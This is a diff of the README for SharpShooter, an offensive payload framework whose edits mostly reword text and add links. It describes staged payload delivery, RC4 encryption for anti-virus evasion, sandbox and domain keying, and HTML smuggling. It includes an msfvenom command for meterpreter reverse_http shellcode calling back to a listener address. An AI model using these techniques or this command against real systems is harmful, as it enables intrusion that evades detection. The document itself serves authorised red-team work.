@@ -12,13 +12,13 @@ Description
 ===========
 
 SharpShooter is a payload creation framework for the retrieval and execution of arbitrary CSharp source code.
-SharpShooter is capable of creating payloads in a variety of formats, including HTA, JS, VBS and WSF. It leverages James Forshaw's DotNetToJavaScript tool to invoke methods from the SharpShooter DotNet serialised object. Payloads can be retrieved using with Web or DNS delivery; SharpShooter is compatible with the MDSec ActiveBreach PowerDNS project.
+SharpShooter is capable of creating payloads in a variety of formats, including HTA, JS, VBS and WSF. It leverages James Forshaw's DotNetToJavaScript tool to invoke methods from the SharpShooter DotNet serialised object. Payloads can be retrieved using Web or DNS delivery or both; SharpShooter is compatible with the MDSec ActiveBreach PowerDNS project.
 
-SharpShooter payloads are RC4 encrypted to provide some anti-virus evasion, and the project includes the capability to integrate sandbox detection and environment keying to assist in evading detection.
+SharpShooter payloads are RC4 encrypted with a random key to provide some modest anti-virus evasion, and the project includes the capability to integrate sandbox detection and environment keying to assist in evading detection.
 
 SharpShooter includes a predefined CSharp template for executing shellcode, but any CSharp code can be compiled and invoked in memory using reflection, courtesy of CSharp's CodeDom.
 
-Finally, SharpShooter provides the ability to bundle the payload in a HTML file using the Demiguise HTML smuggling technique.
+Finally, SharpShooter provides the ability to bundle the payload inside an HTML file using the (Demiguise HTML smuggling)[https://github.com/nccgroup/demiguise] technique.
 
 Further information can be found on the MDSec blog post.
 
@@ -49,7 +49,7 @@ The above menu selects the type of payload that you want to generate. Currently 
 [0] Done
 ```
 
-SharpShooter includes the ability to embed anti-sandbox defences in to the payload, these are predominantly taken from the CheckPlease project with the exception of Domain Keying which allows you to limit your payload to running only on domain members from a target domain. More than one technique can be selected and if the conditions are met, such as the host not being domain joined (2), then the payload will not execute. The theory here is that if the sandbox does not see the bad behaviour, it will assume it to be safe.
+SharpShooter includes the ability to embed anti-sandbox defences in to the payload, these are predominantly taken from the (CheckPlease project)[https://github.com/Arvanaghi/CheckPlease] with the exception of Domain Keying which allows you to limit your payload to running only on domain members from a target domain. More than one technique can be selected and if the conditions are met, such as the host not being domain joined (2), then the payload will not execute. The theory here is that if the sandbox does not see the bad behaviour, it will assume your payload to be safe.
 
 ```
 [*] Select the delivery method for the staged payload:
@@ -66,7 +66,7 @@ This menu option details the method that will be used to perform staging and whe
 
 SharpShooter contains a basic template for executing shellcode, here you can paste in a CSharp byte array of either your x86 or x64 shellcode.
 
-On 64-bit systems you must use x64 shellcode for JS/JSE, VBS/VBE and WSF payloads; you can generate it similar to the following:
+On 64-bit systems you must use x64 shellcode for JS/JSE, VBS/VBE and WSF payloads; you can generate it using msfvenom similar to the following:
 
 ```
 msfvenom -a x64 -p windows/x64/meterpreter/reverse_http LHOST=172.16.164.203 LPORT=8080 EnableStageEncoding=True PrependMigrate=True -f csharp
@@ -95,7 +95,7 @@ SharpShooter contains 2 pre-defined templates; it is recommended you create a cu
 
 Author and Credits
 ==================
-Author: Dominic Chell (@domchell)
+Author: Dominic Chell (@domchell)[https://twitter.com/domchell]
 
 Credits:
 - @tiraniddo: James Forshaw for DotNetToJScript
